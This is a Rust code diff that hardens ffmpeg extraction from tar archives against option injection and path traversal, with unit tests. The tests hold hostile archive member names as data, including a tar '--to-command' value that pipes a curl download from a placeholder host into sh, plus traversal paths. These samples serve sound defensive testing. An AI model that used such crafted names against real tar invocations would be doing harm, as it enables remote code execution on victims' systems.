@@ -191,6 +191,32 @@ fn extract_ffmpeg_from_zip(archive_path: &Path, output_path: &Path) -> Result<()
     ))
 }
 
+/// Returns whether an archive member name is a safe ffmpeg binary to extract.
+///
+/// The name comes out of `tar tf`, i.e. from the archive itself, so it is
+/// untrusted input. Two properties matter: tar treats a `-`-prefixed operand as
+/// an option wherever it appears (`--to-command=<shell>` runs a command per
+/// member), and an absolute or `..`-containing name would land outside the temp
+/// directory it is extracted into.
+fn is_safe_ffmpeg_entry(entry: &str) -> bool {
+    use std::path::Component;
+
+    if entry.starts_with('-') {
+        return false;
+    }
+
+    let path = Path::new(entry);
+    if path
+        .components()
+        .any(|c| !matches!(c, Component::Normal(_) | Component::CurDir))
+    {
+        return false;
+    }
+
+    path.file_name()
+        .is_some_and(|f| f == "ffmpeg" || f == "ffmpeg.exe")
+}
+
 /// Extracts the ffmpeg binary from a tar.xz archive using the system `tar` command.
 ///
 /// # Errors
@@ -217,17 +243,15 @@ fn extract_ffmpeg_from_tar_xz(
     let contents = String::from_utf8_lossy(&list_output.stdout);
     let ffmpeg_entry = contents
         .lines()
-        .find(|line| {
-            let path = Path::new(line);
-            path.file_name()
-                .is_some_and(|f| f == "ffmpeg" || f == "ffmpeg.exe")
-        })
+        .find(|line| is_safe_ffmpeg_entry(line))
         .ok_or_else(|| {
             ConverterError::ConversionFailed("ffmpeg binary not found in archive".to_string())
         })?
         .to_string();
 
-    // Extract the specific file
+    // Extract the specific file. `--` ends option parsing so the member name,
+    // which comes from the archive rather than from us, cannot be read as a
+    // tar option even if `is_safe_ffmpeg_entry` is ever loosened.
     let temp_dir = archive_path.parent().unwrap_or(Path::new("/tmp"));
     let extract_output = Command::new("tar")
         .args([
@@ -235,6 +259,7 @@ fn extract_ffmpeg_from_tar_xz(
             &archive_path.to_string_lossy(),
             "-C",
             &temp_dir.to_string_lossy(),
+            "--",
             &ffmpeg_entry,
         ])
         .output()
@@ -308,6 +333,7 @@ where
     };
     let archive_path = dir.join(format!("ffmpeg-download.{archive_ext}"));
 
+    crate::download::validate_executable_url(url).map_err(ConverterError::from)?;
     crate::download::download_file(url, &archive_path, &on_progress)
         .await
         .map_err(ConverterError::from)?;
@@ -499,6 +525,41 @@ mod tests {
 
         let result = extract_ffmpeg_from_zip(&archive_path, &output_path);
         assert!(result.is_err(), "should fail with invalid archive");
+    }
+
+    // --- is_safe_ffmpeg_entry ---
+
+    #[test]
+    fn is_safe_ffmpeg_entry_accepts_plain_and_nested_names() {
+        assert!(is_safe_ffmpeg_entry("ffmpeg"));
+        assert!(is_safe_ffmpeg_entry("ffmpeg.exe"));
+        assert!(is_safe_ffmpeg_entry("ffmpeg-n8.1-linux64-lgpl/bin/ffmpeg"));
+        assert!(is_safe_ffmpeg_entry("./bin/ffmpeg"));
+    }
+
+    #[test]
+    fn is_safe_ffmpeg_entry_rejects_option_lookalikes() {
+        // `Path::file_name` of these is "ffmpeg", so the basename check alone
+        // would accept them and tar would run them as options.
+        assert!(!is_safe_ffmpeg_entry(
+            "--to-command=sh -c 'curl http://x|sh' #/ffmpeg"
+        ));
+        assert!(!is_safe_ffmpeg_entry("--use-compress-program=bin/ffmpeg"));
+        assert!(!is_safe_ffmpeg_entry("-C/tmp/ffmpeg"));
+    }
+
+    #[test]
+    fn is_safe_ffmpeg_entry_rejects_escaping_paths() {
+        assert!(!is_safe_ffmpeg_entry("/usr/local/bin/ffmpeg"));
+        assert!(!is_safe_ffmpeg_entry("../../bin/ffmpeg"));
+        assert!(!is_safe_ffmpeg_entry("a/../../ffmpeg"));
+    }
+
+    #[test]
+    fn is_safe_ffmpeg_entry_rejects_other_binaries() {
+        assert!(!is_safe_ffmpeg_entry("bin/ffprobe"));
+        assert!(!is_safe_ffmpeg_entry("README.txt"));
+        assert!(!is_safe_ffmpeg_entry(""));
     }
 
     // --- version pinning ---
